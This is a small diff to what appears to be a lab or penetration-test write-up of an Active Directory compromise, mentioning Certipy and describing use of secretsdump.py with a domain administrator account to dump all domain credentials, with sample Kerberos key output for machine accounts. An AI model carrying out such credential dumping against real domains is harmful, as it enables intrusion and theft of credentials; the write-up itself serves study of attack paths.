@@ -590,7 +590,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 
 ## RUN-SRV
-## Domain Compromise
+### Domain Compromise
 
 With `j.reed_adm` obtained and of which is a domain administrator, the attacker simply uses secretsdump.py to dump all domain credentials, fully compromising the active directory.
 ```bash
@@ -665,5 +665,4 @@ BIKE-SRV$:des-cbc-md5:381632970b5b589b
 SWIM-SRV$:aes256-cts-hmac-sha1-96:66b47549b22bbdc6654e74948f03d39197db43503a5accd99b32522dbf6302fd
 SWIM-SRV$:aes128-cts-hmac-sha1-96:f1c38e2ef2fe0b1bf1582a25395d0a9c
 SWIM-SRV$:des-cbc-md5:9d854c012598c26d
-
 ```
